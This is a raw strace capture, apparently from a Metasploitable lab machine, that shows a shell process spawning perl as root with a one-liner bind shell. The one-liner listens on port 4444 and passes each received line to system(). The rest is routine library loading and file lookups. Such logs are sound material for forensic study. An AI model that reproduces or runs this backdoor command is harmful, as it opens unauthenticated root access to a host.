10193 07:31:50.877636 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 1
10193 07:31:50.877651 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
10193 07:31:50.877740 fstat64(1, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
10193 07:31:50.877757 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7e02000
10193 07:31:50.877769 mmap2(0xb7e0b000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7e0b000
10193 07:31:50.877784 close(1)          = 0
10193 07:31:50.877805 munmap(0xb7fbd000, 29913) = 0
10193 07:31:50.877821 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 1
10193 07:31:50.877835 fcntl64(1, F_GETFD) = 0x1 (flags FD_CLOEXEC)
10193 07:31:50.877847 _llseek(1, 0, [0], SEEK_CUR) = 0
10193 07:31:50.877875 fstat64(1, {st_mode=S_IFREG|0644, st_size=1624, ...}) = 0
10193 07:31:50.877923 mmap2(NULL, 1624, PROT_READ, MAP_SHARED, 1, 0) = 0xb7fc4000
10193 07:31:50.877950 _llseek(1, 1624, [1624], SEEK_SET) = 0
10193 07:31:50.877966 munmap(0xb7fc4000, 1624) = 0
10193 07:31:50.877976 close(1)          = 0
10193 07:31:50.878004 getpgrp()         = 3831
10193 07:31:50.878014 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
10193 07:31:50.878030 getrlimit(RLIMIT_NPROC, {rlim_cur=8191, rlim_max=8191}) = 0
10193 07:31:50.878046 brk(0x8101000)    = 0x8101000
10193 07:31:50.878077 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10193 07:31:50.878092 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10193 07:31:50.878106 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10193 07:31:50.878143 brk(0x8102000)    = 0x8102000
10193 07:31:50.878169 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10193 07:31:50.878188 stat64("/sbin/AB", 0xbf918f68) = -1 ENOENT (No such file or directory)
10193 07:31:50.878200 stat64("/bin/AB", 0xbf918f68) = -1 ENOENT (No such file or directory)
10193 07:31:50.878211 stat64("/usr/sbin/AB", 0xbf918f68) = -1 ENOENT (No such file or directory)
10193 07:31:50.878223 stat64("/usr/bin/AB", 0xbf918f68) = -1 ENOENT (No such file or directory)
10193 07:31:50.878240 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
10193 07:31:50.878255 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e386f8) = 10194
10194 07:31:50.878299 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10194 07:31:50.878315 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
10194 07:31:50.878328 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
10194 07:31:50.878340 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
10194 07:31:50.878414 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10194 07:31:50.878433 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
10194 07:31:50.878461 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
10194 07:31:50.878516 write(2, "sh: AB: command not found\n", 26) = -1 EPIPE (Broken pipe)
10194 07:31:50.878531 --- SIGPIPE (Broken pipe) @ 0 (0) ---
10194 07:31:50.878600 exit_group(127)   = ?
4519  07:31:50.904832 waitpid(10193,  <unfinished ...>
10193 07:31:50.914024 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10193 07:31:50.914025 --- SIGCHLD (Child exited) @ 0 (0) ---
10193 07:31:50.914025 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 10194
10193 07:31:50.914025 waitpid(-1, 0xbf918be8, WNOHANG) = -1 ECHILD (No child processes)
10193 07:31:50.914025 sigreturn()       = ? (mask now [])
10193 07:31:50.914045 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10193 07:31:50.914060 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10193 07:31:50.914071 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10193 07:31:50.914083 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_DFL}, 8) = 0
10193 07:31:50.914102 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10193 07:31:50.914113 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
10193 07:31:50.914148 stat64(".", {st_mode=S_IFDIR|0700, st_size=4096, ...}) = 0
10193 07:31:50.914169 stat64("/sbin/perl", 0xbf918f98) = -1 ENOENT (No such file or directory)
10193 07:31:50.914181 stat64("/bin/perl", 0xbf918f98) = -1 ENOENT (No such file or directory)
10193 07:31:50.914192 stat64("/usr/sbin/perl", 0xbf918f98) = -1 ENOENT (No such file or directory)
10193 07:31:50.914204 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
10193 07:31:50.914222 stat64("/usr/bin/perl", {st_mode=S_IFREG|0755, st_size=1080724, ...}) = 0
10193 07:31:50.914247 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [], 8) = 0
10193 07:31:50.914261 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7e386f8) = 10195
10195 07:31:50.914326 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10195 07:31:50.914374 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
10195 07:31:50.914404 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
10195 07:31:50.914433 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
10195 07:31:50.914449 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
10195 07:31:50.914464 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
10195 07:31:50.914477 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
10195 07:31:50.914511 execve("/usr/bin/perl", ["perl", "-MIO", "-e", "$p=fork();exit,if$p;foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(LocalPort,4444,Reuse,1,Listen)->accept;$~->fdopen($c,w);STDIN->fdopen($c,r);while(<>){if($_=~ /(.*)/){system $1;}};"], [/* 14 vars */]) = 0
10195 07:31:50.914600 brk(0)            = 0x8153000
10195 07:31:50.914621 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10195 07:31:50.914636 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f28000
10195 07:31:50.914652 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
10195 07:31:50.914670 open("/etc/ld.so.cache", O_RDONLY) = 1
10195 07:31:50.914683 fstat64(1, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10195 07:31:50.914699 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 1, 0) = 0xb7f20000
10195 07:31:50.914709 close(1)          = 0
10195 07:31:50.914720 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10195 07:31:50.914740 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 1
10195 07:31:50.914755 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\0004\0\0\0L!\0\0\0\0\0\0004\0 \0\10\0(\0\35\0\34\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0003\33\0\0003\33\0\0003\33\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\374\34\0\0\374\34\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264\36\0\0\264.\0\0\264.\0\0\230\1\0\0\310\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320\36\0\0\320.\0\0\320.\0\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\264\36\0\0\264.\0\0\264.\0\0@\1\0\0@\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\26\0\0\0\31\0\0\0\4\0\0\0\7\0\0\0\230\0\21\0\0B\0\0\202\0`\10\223(\10\336\31\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\32\0\0\0\0\0\0\0\33\0\0\0\34\0\0\0\0\0\0\0\36\0\0\0\0\0\0\0\0\0\0\0\37\0\0\0!\0\0\0\"\0\0\0\0\0\0\0\0\0\0\0#\0\0\0%\0\0\0&\0\0\0\0\0\0\0(\0\0\0\221!\374\370\225\263_\31\5\350\7\371\6\2\4\371\7\2\4\371\301S\200\30\256\304M\17a\242\222\6\325=l\366\327=l\366\370\31sB\353\26\251\30\373\31sB", 512) = 512
10195 07:31:50.914902 fstat64(1, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
10195 07:31:50.914920 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7f1c000
10195 07:31:50.914932 mmap2(0xb7f1e000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x1) = 0xb7f1e000
10195 07:31:50.914948 close(1)          = 0
10195 07:31:50.914959 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10195 07:31:50.914973 open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 1
10195 07:31:50.914987 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@4\0\0004\0\0\0PB\2\0\0\0\0\0004\0 \0\t\0(\0 \0\37\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0x\20\2\0x\20\2\0x\20\2\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0$/\2\0$/\2\0\5\0\0\0\0\20\0\0\1\0\0\0\334>\2\0\334>\2\0\334>\2\0`\1\0\0\244\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\360>\2\0\360>\2\0\360>\2\0\350\0\0\0\350\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\214\20\2\0\214\20\2\0\214\20\2\0\34\4\0\0\34\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\334>\2\0\334>\2\0\334>\2\0\30\1\0\0\30\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\214\2\0\0\17\0\0\0@\0\0\0\v\0\0\0%\220 \305\t\204g\v\0\302\20 \4iER\202\20\200\240\0}\210\272\10\10I\0\0\0\0\0\33\4\201\0\0\0\232U\20A P \200\224\202\220\21@\3722\0\304a\24\0\10\6\306\220\232\f\207\300 \250\0  \202\0\230\201\4E\7\0054a\2\0\0\251C\30\310 \10\23\30\24M8\"\0\22\24\21@T\203\2E\1\1\1\244\fX\20\0\210\2\0 \0@\0$\214\5\10", 512) = 512
10195 07:31:50.915073 fstat64(1, {st_mode=S_IFREG|0644, st_size=149328, ...}) = 0
10195 07:31:50.915090 mmap2(NULL, 147584, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ef7000
10195 07:31:50.915101 mmap2(0xb7f1a000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x23) = 0xb7f1a000
10195 07:31:50.915116 close(1)          = 0
10195 07:31:50.915128 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10195 07:31:50.915141 open("/lib/tls/i686/cmov/libpthread.so.0", O_RDONLY) = 1
10195 07:31:50.915155 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20H\0\0004\0\0\0\330C\1\0\0\0\0\0004\0 \0\t\0(\0$\0!\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0 \1\0\0 \1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\224\n\1\0\224\n\1\0\224\n\1\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4;\1\0\4;\1\0\5\0\0\0\0\20\0\0\1\0\0\0\344=\1\0\344M\1\0\344M\1\0T\3\0\0\374#\0\0\6\0\0\0\0\20\0\0\2\0\0\0\324>\1\0\324N\1\0\324N\1\0\370\0\0\0\370\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0T\1\0\0T\1\0\0T\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0P\345td\250\n\1\0\250\n\1\0\250\n\1\0\314\4\0\0\314\4\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\344=\1\0\344M\1\0\344M\1\0\20\2\0\0\20\2\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\262\1\0\0L\0\0\0@\0\0\0\v\0\0\0\31!\2\221\1\n\20\"@H \331\3\0I4\200\0\0@\0 \200\200\21P`@@\22\213\0020D\0\0\20\0\0\2\0\1\r\0\204\n\360\1X\260\r\240\200\10 $\204\20B\242)m\10G\234V\20\0\224 \204$\10\0H(\1\222\34\301B\240\220\22\10\f \2\30`A\244c\4\0\n\32\3\0\0)\0(\314@\204\210L\22\10\241\0\4\0\10\0\300Q\0\2009\4C\300", 512) = 512
10195 07:31:50.915242 fstat64(1, {st_mode=S_IFREG|0755, st_size=112354, ...}) = 0
10195 07:31:50.915259 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ef6000
10195 07:31:50.915271 mmap2(NULL, 94688, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7ede000
10195 07:31:50.915282 mmap2(0xb7ef2000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x13) = 0xb7ef2000
10195 07:31:50.915296 mmap2(0xb7ef4000, 4576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ef4000
10195 07:31:50.915322 close(1)          = 0
10195 07:31:50.915364 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10195 07:31:50.915378 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 1
10195 07:31:50.915425 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1\0004\0\0\0\4\307\24\0\0\0\0\0004\0 \0\n\0(\0D\0C\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0@\1\0\0@\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\2200\23\0\2200\23\0\2200\23\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0(\215\24\0(\215\24\0\5\0\0\0\0\20\0\0\1\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\260\'\0\0\204T\0\0\6\0\0\0\0\20\0\0\2\0\0\0\234\255\24\0\234\255\24\0\234\255\24\0\360\0\0\0\360\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0t\1\0\0t\1\0\0t\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0\7\0\0\0\354\221\24\0\354\221\24\0\354\221\24\0\10\0\0\0,\0\0\0\4\0\0\0\4\0\0\0P\345td\2440\23\0\2440\23\0\2440\23\0\354+\0\0\354+\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\354\221\24\0\354\221\24\0\354\221\24\0\10\36\0\0\10\36\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\363\3\0\0\n\0\0\0\0\2\0\0\16\0\0\0\2400\20D\200 \2\1\214\3\346\220AE\210\0\204\0\10\0A\200\0@\300\200\0\f\2\f\0\0010\0\10@\"\10\246\4\210H6l\240\0260\0&\204\200\216\4\10B$\2\f\246\244\32\6c\310\0\302 \1\300\0R\0!\201\10\4\n  \250\24\0\24(`\0\0P\240\312DB", 512) = 512
10195 07:31:50.915610 fstat64(1, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
10195 07:31:50.915629 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d8f000
10195 07:31:50.915641 mmap2(0xb7ed8000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x149) = 0xb7ed8000
10195 07:31:50.915657 mmap2(0xb7edb000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7edb000
10195 07:31:50.915670 close(1)          = 0
10195 07:31:50.915682 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10195 07:31:50.915695 open("/lib/tls/i686/cmov/libcrypt.so.1", O_RDONLY) = 1
10195 07:31:50.915710 read(1, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\7\0\0004\0\0\0<\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\340\210\0\0\340\210\0\0\340\210\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\f\212\0\0\f\212\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0`\1\0\0tr\2\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0\17\0\0\0\22\0\0\0\2\0\0\0\6\0\0\0\4\311\240, \4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
10195 07:31:50.915812 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
10195 07:31:50.915856 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7d5d000
10195 07:31:50.915868 mmap2(0xb7d66000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7d66000
10195 07:31:50.915896 mmap2(0xb7d68000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d68000
10195 07:31:50.915910 close(1)          = 0
10195 07:31:50.915933 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d5c000
10195 07:31:50.915945 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7d5c8c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
10195 07:31:50.916005 mprotect(0xb7ed8000, 4096, PROT_READ) = 0
10195 07:31:50.916032 munmap(0xb7f20000, 29913) = 0
10195 07:31:50.916045 set_tid_address(0xb7d5c908) = 10195
10195 07:31:50.916054 set_robust_list(0xb7d5c910, 0xc) = 0
10195 07:31:50.916063 futex(0xbfc578f0, 0x81 /* FUTEX_??? */, 1) = 0
10195 07:31:50.916077 rt_sigaction(SIGRTMIN, {0xb7ee22c0, [], SA_SIGINFO}, NULL, 8) = 0
10195 07:31:50.916090 rt_sigaction(SIGRT_1, {0xb7ee2340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
10195 07:31:50.916103 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
10195 07:31:50.916116 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
10195 07:31:50.916135 uname({sys="Linux", node="metasploitable", ...}) = 0
10195 07:31:50.916181 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
10195 07:31:50.916226 brk(0)            = 0x8153000
10195 07:31:50.916236 brk(0x8174000)    = 0x8174000
10195 07:31:50.916280 getuid32()        = 0
10195 07:31:50.916290 geteuid32()       = 0
10195 07:31:50.916310 getgid32()        = 0
10195 07:31:50.916319 getegid32()       = 0
10195 07:31:50.916400 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d3b000
10195 07:31:50.916428 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
10195 07:31:50.916445 read(1, "\240\334\4\201", 4) = 4
10195 07:31:50.916458 close(1)          = 0
10195 07:31:50.916476 time(NULL)        = 1495625510
10195 07:31:50.916516 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfc575c0) = -1 ENOENT (No such file or directory)
10195 07:31:50.916535 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfc575c0) = -1 ENOENT (No such file or directory)
10195 07:31:50.916548 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfc575c0) = -1 ENOENT (No such file or directory)
10195 07:31:50.916563 stat64("/usr/local/lib/perl/5.8.7", 0xbfc57700) = -1 ENOENT (No such file or directory)
10195 07:31:50.916576 stat64("/usr/local/share/perl/5.8.7", 0xbfc57700) = -1 ENOENT (No such file or directory)
10195 07:31:50.916588 stat64("/usr/local/lib/perl/5.8.6", 0xbfc57700) = -1 ENOENT (No such file or directory)
10195 07:31:50.916599 stat64("/usr/local/share/perl/5.8.6", 0xbfc57700) = -1 ENOENT (No such file or directory)
10195 07:31:50.916611 stat64("/usr/local/lib/perl/5.8.4", 0xbfc57700) = -1 ENOENT (No such file or directory)
10195 07:31:50.916623 stat64("/usr/local/share/perl/5.8.4", 0xbfc57700) = -1 ENOENT (No such file or directory)
10195 07:31:50.916634 stat64("/usr/local/lib/perl/5.8.3", 0xbfc57700) = -1 ENOENT (No such file or directory)
10195 07:31:50.916646 stat64("/usr/local/share/perl/5.8.3", 0xbfc57700) = -1 ENOENT (No such file or directory)
10195 07:31:50.916657 stat64("/usr/local/lib/perl/5.8.2", 0xbfc57700) = -1 ENOENT (No such file or directory)
10195 07:31:50.916669 stat64("/usr/local/share/perl/5.8.2", 0xbfc57700) = -1 ENOENT (No such file or directory)
10195 07:31:50.916680 stat64("/usr/local/lib/perl/5.8.1", 0xbfc57700) = -1 ENOENT (No such file or directory)
10195 07:31:50.916692 stat64("/usr/local/share/perl/5.8.1", 0xbfc57700) = -1 ENOENT (No such file or directory)
10195 07:31:50.916707 stat64("/usr/local/lib/perl/5.8.0", 0xbfc57700) = -1 ENOENT (No such file or directory)
10195 07:31:50.916718 stat64("/usr/local/share/perl/5.8.0", 0xbfc57700) = -1 ENOENT (No such file or directory)
10195 07:31:50.916741 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc573f8) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.916755 _llseek(0, 0, [0], SEEK_CUR) = 0
10195 07:31:50.916766 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc573f8) = -1 EBADF (Bad file descriptor)
10195 07:31:50.916777 _llseek(1, 0, 0xbfc57440, SEEK_CUR) = -1 EBADF (Bad file descriptor)
10195 07:31:50.916787 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc573f8) = -1 EINVAL (Invalid argument)
10195 07:31:50.916810 _llseek(2, 0, 0xbfc57440, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10195 07:31:50.916846 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
10195 07:31:50.916859 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc574b8) = -1 ENOTTY (Inappropriate ioctl for device)
10195 07:31:50.916884 _llseek(1, 0, [0], SEEK_CUR) = 0
10195 07:31:50.916895 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
10195 07:31:50.916907 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
10195 07:31:50.916925 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
10195 07:31:50.916976 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
10195 07:31:50.917018 getppid()         = 10193
10195 07:31:50.917078 stat64("/etc/perl/IO.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.917092 stat64("/etc/perl/IO.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
10195 07:31:50.917105 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfc571ac) = -1 ENOENT (No such file or directory)
10195 07:31:50.917117 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfc570bc) = -1 ENOENT (No such file or directory)
